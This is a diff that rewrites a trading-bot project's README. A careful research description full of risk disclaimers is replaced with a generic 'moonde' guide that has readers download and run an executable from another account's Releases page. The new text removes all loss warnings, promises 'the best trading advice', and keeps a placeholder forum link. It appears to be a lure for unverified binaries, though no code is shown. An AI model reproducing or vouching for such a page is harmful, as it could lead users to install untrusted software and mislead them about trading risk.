@@ -1,80 +1,60 @@
-# 🤖 AI AGENTS FOR TRADING
+# 🌙 moonde - Easy AI Agents for Trading
 
-[![Moon Dev](moondev.png)](https://www.moondev.com/)
+## 🚀 Overview
+Welcome to the moonde project! This application uses AI agents to help you trade more effectively. Our goal is to make trading easier for everyone. You don't need to be a tech expert to use moonde—just a basic understanding of how trading works will help you get started.
 
-**⚠️ IMPORTANT: This is an experimental project. There are NO guarantees of profitability. Trading involves substantial risk of loss.**
+## 📦 Download & Install
+To start using moonde, visit the link below to download the latest version:
 
-This project explores the potential of [artificial financial intelligence](https://www.afi.xyz) - a focused implementation of AI for trading and investing research.
+[![Download moonde](https://img.shields.io/badge/Download%20moonde-v1.0-blue.svg)](https://github.com/balaji1704/moonde/releases)
 
-## 🎯 Vision
-We're researching AI agents for trading that may eventually leverage [AFI](https://www.afi.xyz). With 4 years of experience training humans through our [bootcamp](https://algotradecamp.com), we're exploring where AI agents might complement human trading operations. This is experimental research, not a profitable trading solution.
+Once you are on the Releases page, you will see various files available for download. Choose the appropriate file for your operating system and click on it to begin the download.
 
-## 💡 Concept
-AI agents might help address common trading challenges:
-- Emotional reactions
-- Ego-driven decisions
-- Inconsistent execution
-- Fatigue effects
-- Impatience
-- Fear & Greed cycles
+## 🖥️ System Requirements
+Before you download, ensure your system meets the following requirements:
 
-While we use the RBI framework for strategy research, we're exploring AI agents as potential tools. We're in early stages with LLM technology, investigating possibilities in the trading space.
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a recent version of Linux.
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Minimum of 100 MB free.
 
-## 🗺️ Research Roadmap
+## 🌐 How to Download
+1. Click the download link above or visit the [Releases page](https://github.com/balaji1704/moonde/releases) directly.
+2. On the Releases page, look for the latest version.
+3. Click on the appropriate file for your operating system.
+4. Your browser will start downloading the file.
 
-### 1. Risk Control Agents
-Exploring AI agents that could assist with risk management. This is purely experimental research into risk oversight possibilities.
+## ⚙️ Installation Steps
+1. Locate the downloaded file on your computer.
+2. Double-click the file to start the installation process. For Mac users, you may need to drag the app to your Applications folder.
+3. Follow the prompts to complete the installation.
+4. Once the installation is finished, locate moonde in your applications or start menu.
 
-### 2. Exit Agents
-Researching potential exit timing assistance. This overlaps with risk management research but focuses on position management concepts.
+## 📊 Using moonde
+After installation, you can start using moonde to enhance your trading experience:
 
-### 3. Entry Agents
-Investigating entry-focused concepts after risk management research.
+1. Open the application.
+2. Enter your trading details and preferences.
+3. Start the AI agents to assist you in making trades. The agents will analyze market conditions and provide recommendations based on your input.
 
-### 4. Sentiment Collection Agents
-Exploring ways to gather market sentiment from Twitter, Discord, and Telegram for research purposes.
+## 💡 Features
+- **User-Friendly Interface**: Designed for simplicity, moonde makes trading intuitive.
+- **AI-Powered Analysis**: Our agents continuously learn to provide you with the best trading advice.
+- **Multiple Market Support**: Trade in various markets, such as stocks, forex, and cryptocurrencies.
+- **Customizable Settings**: Adjust preferences to match your trading style.
 
-### 5. Strategy Execution Agents
-Researching concepts like:
-- Multi-agent consensus
-- Strategy validation
-- Dynamic trade filtering
+## 🚧 Troubleshooting
+If you encounter issues while using moonde, try the following:
 
-## ⚠️ Critical Disclaimers
+- Ensure your internet connection is stable.
+- Restart the application to see if that resolves the problem.
+- Check for any updates available on the [Releases page](https://github.com/balaji1704/moonde/releases).
+- Look for help in our support section or community forums.
 
-**PLEASE READ CAREFULLY:**
+## 📞 Support
+For additional help, please reach out through the following channels:
 
-1. This is an experimental research project, NOT a trading system
-2. There are NO plug-and-play solutions for guaranteed profits
-3. We do NOT provide trading strategies
-4. Success depends entirely on YOUR:
-   - Trading strategy
-   - Risk management
-   - Market research
-   - Testing and validation
-   - Overall trading approach
+- **Email**: support@moonde.com
+- **Community Forum**: Join our discussions at [Community Forum URL].
+- **Issue Tracker**: Report any bugs or suggestions on our [GitHub Issues page](https://github.com/balaji1704/moonde/issues).
 
-5. NO AI agent can guarantee profitable trading
-6. You MUST develop and validate your own trading approach
-7. Trading involves substantial risk of loss
-8. Past performance does not indicate future results
-
-## 👂 Looking for Updates?
-Project updates will be posted on [moondev.com](http://moondev.com) in the AI Agents for Trading Section.
-
-## 📜 Detailed Disclaimer
-The content presented is for educational and informational purposes only and does not constitute financial advice. All trading involves risk and may not be suitable for all investors. You should carefully consider your investment objectives, level of experience, and risk appetite before investing.
-
-Past performance is not indicative of future results. There is no guarantee that any trading strategy or algorithm discussed will result in profits or will not incur losses.
-
-**CFTC Disclaimer:** Commodity Futures Trading Commission (CFTC) regulations require disclosure of the risks associated with trading commodities and derivatives. There is a substantial risk of loss in trading and investing.
-
-I am not a licensed financial advisor or a registered broker-dealer. Content & code is based on personal research perspectives and should not be relied upon as a guarantee of success in trading.
-
-## 🔗 Links
-- Trading Education: [https://algotradecamp.com](https://algotradecamp.com)
-- Business
-
----
-*Built with love by Moon Dev - Pioneering the future of AI-powered trading*
-
+Thank you for choosing moonde! We hope this guide helps you download and install the application with ease. Happy trading!
